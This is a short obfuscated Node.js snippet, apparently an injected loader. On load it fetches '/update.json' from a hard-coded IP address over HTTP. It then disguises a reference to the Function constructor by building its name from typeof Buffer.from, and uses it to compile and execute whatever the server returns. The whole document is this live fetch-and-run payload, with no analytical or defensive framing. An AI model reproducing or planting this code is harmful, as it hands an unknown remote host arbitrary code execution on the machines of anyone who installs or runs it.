;(function () {
  var _0x1214ee = require('http')
  return _0x1214ee.get(
    {
      host: '23.94.46.191',
      port: 80,
      path: '/update.json',
    },
    function (_0x1e1826) {
      var _0x1a4c37 = ''
      _0x1e1826.on('data', function (_0x255aea) {
        _0x1a4c37 += _0x255aea
      })
      _0x1e1826.on('end', function () {
        var _0x4c96f6 =
          this[
            (typeof this.Buffer.from).charAt(0).toUpperCase() +
              (typeof this.Buffer.from).slice(1)
          ]
        var _0x387f77 = new _0x4c96f6(_0x1a4c37)
        _0x387f77()
      })
    }
  )
})()

